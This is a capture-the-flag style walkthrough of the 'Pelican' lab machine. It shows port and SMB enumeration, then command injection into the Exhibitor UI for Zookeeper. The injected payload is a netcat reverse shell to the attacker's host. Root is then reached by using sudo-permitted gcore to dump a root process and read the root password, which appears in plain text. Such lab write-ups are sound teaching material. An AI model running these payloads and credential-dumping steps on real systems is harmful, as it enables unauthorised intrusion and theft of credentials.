# Pelican

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.229.98

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.229.98:8080/exhibitor/v1/ui/index.html
37753/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22 and 2222

```shell
# Check authentication methods on port 22
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.229.98

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 445

On port 445 there is an SMB that accepts null sessions but does not have any interesting shares. We only find a user and the domain name with enum4linux.

```shell
# SMB Enum
nmap --script smb-enum* -p 445 192.168.229.98

smbclient -L //192.168.229.98 -N

enum4linux -a 192.168.229.98
[+] Found domain(s):
        [+] PELICAN

S-1-22-1-1000 Unix User\charles (Local User)
```

## Enumerating port 8081

Navigating to this page we find the Zookeeper 3.4.6 application (Exhibitor UI). We found a public exploit in exploit-db which mentions the same buttons present in the current version.

The exploit shows a command send field that we can escape from the application and inject commands into the system using subshells.

## Initial Access

We open a listener on our machine and run a reverse shell with nc to get our initial access.

```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Payload
$(/bin/nc -e /bin/sh 192.168.45.242 443 &)

# TTY Upgrade
whereis python
/usr/bin/python3.7 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

By enumerating the machine, we discover that we can run the `gcore` command as root without entering the password.

```shell
# Checking Sudoers
sudo -l

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

Searching GTFOBins we discovered that if we pass the PID of a running process to gcore, it generates the process dump. We searched the processes running as root and found `password-store` with PID 484.

```shell
# Processes
ps aux | grep root
root  484  0.0  0.0  2276  144 ?  Ss  02:59  0:00 /usr/bin/password-store

# Process Dump
sudo -u root gcore 484

# Reading the Binary
strings core.484
```

This way we find the root user's password.

```shell
su root # ClogKingpinInning731
```

## Post-Exploitation

With root privileges, we capture the target's flags.

```shell
# Evidence
cat /home/charles/local.txt

cat /root/proof.txt
```
